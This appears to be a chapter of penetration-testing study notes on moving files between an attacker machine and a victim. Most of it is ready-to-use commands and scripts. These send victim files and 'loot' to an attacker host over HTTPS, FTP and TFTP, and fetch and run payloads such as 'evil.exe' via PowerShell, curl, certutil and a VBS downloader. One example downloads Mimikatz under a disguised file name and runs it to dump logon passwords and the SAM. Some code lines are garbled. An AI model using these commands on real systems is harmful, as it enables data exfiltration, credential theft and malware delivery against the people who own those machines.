

# Chapter 16 - File Transfer

[[#Uplouding files with UpDog]]
[[#Uploading files using HTTPS]]
[[#Uploading files using TFTP]]
[[#Uploading files using FTP]]
[[#Downloading files using FTP]]
[[#Downloading Files - Powershell]]
[[#Downloading Files - Curl wget]]
[[#Downloading Files - WGET VBS]]
[[#Downloading files using SSH (SCP)]]
[[#Downloading files using CertUtil]]
[[#Useful tips]]

# Uplouding files with UpDog
On attacker
https://github.com/sc0tfree/updog
`pip3 install updog`
`updog [-d DIRECTORY] [-p PORT] [--password PASSWORD] [--ssl]`

On Victim (linux and mac)

	curl -v -X POST -F "file=@/Users/gentleman/Desktop/;filename=filename.txt" -F "path=/home/kali/Desktop/oscp" https://192.168.46.2:4000/upload -k -u ":123"
	
	curl -v -X POST -F "file=@/<Path of the file on the target>;filename=filename.txt" -F "path=<Path shared by attacker machine>" https://<IP pf attacker>:<port>/upload -k -u ":<password>"
	
**Windows Victim**
	
	curl -v -X POST -F "file=@C:\Users\user\Desktop\users.csv;filename=users.csv" -F "path=/home/kali/Desktop/oscp" https://192.168.46.2:4000/upload -k -u ":123"
	
# Uploading files using HTTPS

This document explains how to upload files using powershell or curl (on the victim machine) to a python server on the (attacker machine)

This method uses HTTPS and Basic Auth.


## Upload file 

## Method 1 - Powershell command
	Invoke-RestMethod -Uri $uri -Method Post -InFile $uploadPath -UseDefaultCredentials
	
	Invoke-RestMethod -Uri https://192.168.46.1:4433 -Method Post -InFile file.txt -UseDefaultCredentials 

## Method 2 - Powershell script (tested for windows)

Usage:

	.\upload.ps1 <https://ip:port/> <base64(admin:password)> <file (in current dir)> 
	
	.\upload.ps1 https://192.168.46.1:4433/ YWRtaW46cGFzc3dvcmQ= Get-Admins.ps1

```powershell
      
 add-type @"
 using System.Net;
 using System.Security.Cryptography.X509Certificates;
 public class TrustAllCertsPolicy : ICertificatePolicy {
 public bool CheckValidationResult(
 ServicePoint srvPoint, X509Certificate certificate,
 WebRequest request, int certificateProblem) {
 return true;
 }
 }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

$url=$args[0]
$auth=$args[1]
$filename=$args[2]

$WebClient = new-object System.Net.WebClient
$WebClient.Headers.Add("Authorization", "Basic " + $auth)
$WebClient.Headers.Add("X-Atlassian-Token", "nocheck")
$WebClient.UploadFile($url, (Get-Location).Path + "\" + $filename)
```

## Method 3 - Curl (tested for mac and linux)

	curl -F 'file=@filename.txt' -k https://localhost:8000/ -u admin:password
	
This performs bypasses for the certificate issues.

	add-type @"
		using System.Net;
		using System.Security.Cryptography.X509Certificates;
		public class TrustAllCertsPolicy : ICertificatePolicy {
			public bool CheckValidationResult(
				ServicePoint srvPoint, X509Certificate certificate,
				WebRequest request, int certificateProblem) {
				return true;
			}
		}
	"@
	[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

## Python HTTP Server

Create a certificate sp you can use SSL

	openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
	
Usage:

	python Simple-https-server.py 4444 admin:password
	
```python
#!/usr/bin/env python


## CREATE A CERTIFICATE
## openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes


import os
import posixpath
import BaseHTTPServer
import urllib
import cgi
import shutil
import mimetypes
import re
import sys
import base64
import ssl
import SimpleHTTPServer

try:
    from cStringIO import StringIO
except ImportError:
    from StringIO import StringIO


class SimpleHTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):

    """Simple HTTP request handler with GET/HEAD/POST commands.
    This serves files from the current directory and any of its
    subdirectories.  The MIME type for files is determined by
    calling the .guess_type() method. And can reveive file uploaded
    by client.
    The GET/HEAD/POST requests are identical except that the HEAD
    request omits the actual contents of the file.
    """

    server_version = "SimpleHTTPWithUpload/" 

    def do_AUTHHEAD(self):
        print "send header"
        self.send_response(401)
        self.send_header('WWW-Authenticate', 'Basic realm=\"Test\"')
        self.send_header('Content-type', 'text/html')
        self.end_headers()	
	
    def do_GET(self):
        global key
        ''' Present frontpage with user authentication. '''
        if self.headers.getheader('Authorization') == None:
            self.do_AUTHHEAD()
            self.wfile.write('no auth header received')
            pass
        elif self.headers.getheader('Authorization') == 'Basic '+key:
            f = self.send_headå()
            if f:
                self.copyfile(f, self.wfile)
                f.close()
            pass
        else:
            print self.headers.getheader('Authorization')
            self.do_AUTHHEAD()
            self.wfile.write(self.headers.getheader('Authorization'))
            self.wfile.write('not authenticated')
            pass
        

    def do_HEAD(self):
        print "send header"
        self.send_response(401)
        self.send_header('WWW-Authenticate', 'Basic realm=\"Test\"')
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_POST(self):
        if self.headers.getheader('Authorization') == None:
            self.do_AUTHHEAD()
            self.wfile.write('no auth header received')
            pass
        elif self.headers.getheader('Authorization') != 'Basic '+key:
            self.do_AUTHHEAD()
            self.wfile.write(self.headers.getheader('Authorization'))
            self.wfile.write('not authenticated')
            pass
        else:
            """Serve a POST request."""
            r, info = self.deal_post_data()
            print r, info, "by: ", self.client_address
            f = StringIO()
            f.write('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">')
            f.write("<html>\n<title>Upload Result Page</title>\n")
            f.write("<body>\n<h2>Upload Result Page</h2>\n")
            f.write("<hr>\n")
            if r:
                f.write("<strong>Success:</strong>")
            else:
                f.write("<strong>Failed:</strong>")
            f.write(info)
            f.write("<br><a href=\"%s\">back</a>" % ("" if self.headers.getheader('referer') == None else self.headers.getheader('referer')))
            f.write("<hr><small>Powerd By: bones7456, check new version at ")
            f.write("<a href=\"http://li2z.cn/?s=SimpleHTTPServerWithUpload\">")
            f.write("here</a>.</small></body>\n</html>\n")
            length = f.tell()
            f.seek(0)
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.send_header("Content-Length", str(length))
            self.end_headers()
            if f:
                self.copyfile(f, self.wfile)
                f.close()
            pass
        
    def deal_post_data(self):
        boundary = self.headers.plisttext.split("=")[1]
        remainbytes = int(self.headers['content-length'])
        line = self.rfile.readline()
        remainbytes -= len(line)
        if not boundary in line:
            return (False, "Content NOT begin with boundary")
        line = self.rfile.readline()
        remainbytes -= len(line)
        fn = re.findall(r'Content-Disposition.*name="file"; filename="(.*)"', line)
        if not fn:
            return (False, "Can't find out file name...")
        path = self.translate_path(self.path)
        fn = os.path.join(path, fn[0])
        line = self.rfile.readline()
        remainbytes -= len(line)
        line = self.rfile.readline()
        remainbytes -= len(line)
        try:
            if not os.path.exists(os.path.abspath(path)):
                os.makedirs(os.path.abspath(path))
            if os.path.exists(fn):
                os.remove(fn)
            out = open(fn, 'wb')
        except IOError:
            return (False, "Can't create file to write, do you have permission to write?")
                
        preline = self.rfile.readline()
        remainbytes -= len(preline)
        while remainbytes > 0:
            line = self.rfile.readline()
            remainbytes -= len(line)
            if boundary in line:
                preline = preline[0:-1]
                if preline.endswith('\r'):
                    preline = preline[0:-1]
                out.write(preline)
                out.close()
                return (True, "File '%s' upload success!" % fn)
            else:
                out.write(preline)
                preline = line
        return (False, "Unexpect Ends of data.")

    def send_head(self):
        """Common code for GET and HEAD commands.
        This sends the response code and MIME headers.
        Return value is either a file object (which has to be copied
        to the outputfile by the caller unless the command was HEAD,
        and must be closed by the caller under all circumstances), or
        None, in which case the caller has nothing further to do.
        """
        path = self.translate_path(self.path)
        f = None
        if os.path.isdir(path):
            if not self.path.endswith('/'):
                # redirect browser - doing basically what apache does
                self.send_response(301)
                self.send_header("Location", self.path + "/")
                self.end_headers()
                return None
            for index in "index.html", "index.htm":
                index = os.path.join(path, index)
                if os.path.exists(index):
                    path = index
                    break
            else:
                return self.list_directory(path)
        ctype = self.guess_type(path)
        try:
            # Always read in binary mode. Opening files in text mode may cause
            # newline translations, making the actual size of the content
            # transmitted *less* than the content-length!
            f = open(path, 'rb')
        except IOError:
            self.send_error(404, "File not found")
            return None
        self.send_response(200)
        self.send_header("Content-type", ctype)
        fs = os.fstat(f.fileno())
        self.send_header("Content-Length", str(fs[6]))
        self.send_header("Last-Modified", self.date_time_string(fs.st_mtime))
        self.end_headers()
        return f

    def list_directory(self, path):
        """Helper to produce a directory listing (absent index.html).
        Return value is either a file object, or None (indicating an
        error).  In either case, the headers are sent, making the
        interface the same as for send_head().
        """
        try:
            list = os.listdir(path)
        except os.error:
            self.send_error(404, "No permission to list directory")
            return None
        list.sort(key=lambda a: a.lower())
        f = StringIO()
        displaypath = cgi.escape(urllib.unquote(self.path))
        f.write('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">')
        f.write("<html>\n<title>Directory listing for %s</title>\n" % displaypath)
        f.write("<body>\n<h2>Directory listing for %s</h2>\n" % displaypath)
        f.write("<hr>\n")
        f.write("<form ENCTYPE=\"multipart/form-data\" method=\"post\">")
        f.write("<input name=\"file\" type=\"file\"/>")
        f.write("<input type=\"submit\" value=\"upload\"/></form>\n")
        f.write("<hr>\n<ul>\n")
        for name in list:
            fullname = os.path.join(path, name)
            displayname = linkname = name
            # Append / for directories or @ for symbolic links
            if os.path.isdir(fullname):
                displayname = name + "/"
                linkname = name + "/"
            if os.path.islink(fullname):
                displayname = name + "@"
                # Note: a link to a directory displays with @ and links with /
            f.write('<li><a href="%s">%s</a>\n'
                    % (urllib.quote(linkname), cgi.escape(displayname)))
        f.write("</ul>\n<hr>\n</body>\n</html>\n")
        length = f.tell()
        f.seek(0)
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.send_header("Content-Length", str(length))
        self.end_headers()
        return f

    def translate_path(self, path):
        """Translate a /-separated PATH to the local filename syntax.
        Components that mean special things to the local file system
        (e.g. drive or directory names) are ignored.  (XXX They should
        probably be diagnosed.)
        """
        # abandon query parameters
        path = path.split('?',1)[0]
        path = path.split('#',1)[0]
        path = posixpath.normpath(urllib.unquote(path))
        words = path.split('/')
        words = filter(None, words)
        path = os.getcwd()
        for word in words:
            drive, word = os.path.splitdrive(word)
            head, word = os.path.split(word)
            if word in (os.curdir, os.pardir): continue
            path = os.path.join(path, word)
        return path

    def copyfile(self, source, outputfile):
        """Copy all data between two file objects.
        The SOURCE argument is a file object open for reading
        (or anything with a read() method) and the DESTINATION
        argument is a file object open for writing (or
        anything with a write() method).
        The only reason for overriding this would be to change
        the block size or perhaps to replace newlines by CRLF
        -- note however that this the default server uses this
        to copy binary data as well.
        """
        shutil.copyfileobj(source, outputfile)

    def guess_type(self, path):
        """Guess the type of a file.
        Argument is a PATH (a filename).
        Return value is a string of the form type/subtype,
        usable for a MIME Content-type header.
        The default implementation looks the file's extension
        up in the table self.extensions_map, using application/octet-stream
        as a default; however it would be permissible (if
        slow) to look inside the data to make a better guess.
        """

        base, ext = posixpath.splitext(path)
        if ext in self.extensions_map:
            return self.extensions_map[ext]
        ext = ext.lower()
        if ext in self.extensions_map:
            return self.extensions_map[ext]
        else:
            return self.extensions_map['']

    if not mimetypes.inited:
        mimetypes.init() # try to read system mime.types
    extensions_map = mimetypes.types_map.copy()
    extensions_map.update({
        '': 'application/octet-stream', # Default
        '.py': 'text/plain',
        '.c': 'text/plain',
        '.h': 'text/plain',
        })


def test(HandlerClass = SimpleHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', int(sys.argv[1])), HandlerClass)
    httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
    httpd.serve_forever()
    #BaseHTTPServer.test(HandlerClass, ServerClass)

if __name__ == '__main__':
    if len(sys.argv)<3:
        print "usage SimpleAuthServer.py [port] [username:password]"
        sys.exit()
    key = base64.b64encode(sys.argv[2])
    print key
    test()

```

---
		
## Uploading files using TFTP

 
On Kali Linux:

	sudo apt update && sudo apt install atftp
	sudo mkdir /tftp
	sudo chown nobody: /tftp
	sudo atftpd --daemon --port 69 /tftp

On Windows Host:

	tftp -i 10.11.0.4 put important.docx

---
		
## Uploading files using FTP

 
On Kali Linux:

	sudo apt-get install pure-ftpd 
    sudo systemctl restart pure-ftpd
	
On Windows Host:

	 echo open 192.168.46.11 21> ftp.txt
	 echo USER kali>> ftp.txt
	 echo kali>> ftp.txt
	 echo cd /ftphome >> ftp.txt
	 echo put loot.txt >> ftp.txt
	 echo bye >> ftp.txt
	 
	 ftp -v -n -s:ftp.txt

---

## Downloading files using FTP

On Kali Linux:

	sudo apt-get install pure-ftpd 
    sudo systemctl restart pure-ftpd
	
On Windows Host:

	 echo open 192.168.46.11 21> ftp.txt
	 echo USER kali>> ftp.txt
	 echo kali>> ftp.txt
	 echo cd /ftphome >> ftp.txt
	 echo GET nc.exe >> ftp.txt
	 echo bye >> ftp.txt
	 
	 ftp -v -n -s:ftp.txt

---



## Downloading Files - Powershell

Server 

	python -m SimpleHTTPServer 8888
	
Client

	powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4:8888/evil.exe', 'new-exploit.exe')
	
OR

	Invoke-WebRequest -Uri https://raw.githubusercontent.com/thomasmaurer/demo-cloudshell/master/helloworld.ps1 -OutFile .\helloworld.ps1

	
Example: Download Mimikatz


	Invoke-WebRequest -Uri https://github.com/ParrotSec/mimikatz/raw/master/x64/mimikatz.exe -OutFile cutecats.exe
	
	./cutecats.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"

---

## Downloading Files - Curl/wget

Server 

	python -m SimpleHTTPServer 8888
	
Client

	curl http:/ /10.11.0.4:8888/evil.exe -o evil.exe
	wget http:/ /10.11.0.4:8888/evil.exe evil.exe
	
---

## Downloading Files - WGET VBS

In non-interactive shelll

```cmd
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs 
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs 
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

Usage:

	cscript wget.vbs http://192.168.46.1:8000/evil.exe evil.exe

---

## Downloading files using SSH (SCP)

On the kali machine you want to download from

	apt-get install putty-tools
	
	pscp user@192.168.0.10:/Users/username/file.ext ~/Desktop/file.ext

---

## Downloading files using CertUtil

On the Windows victim machine

	certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe

---

## Useful tips

1. Zip and encrypt the file before uploading.

		zip -e -r <zipped-filename.zip> <DirToEncrypt>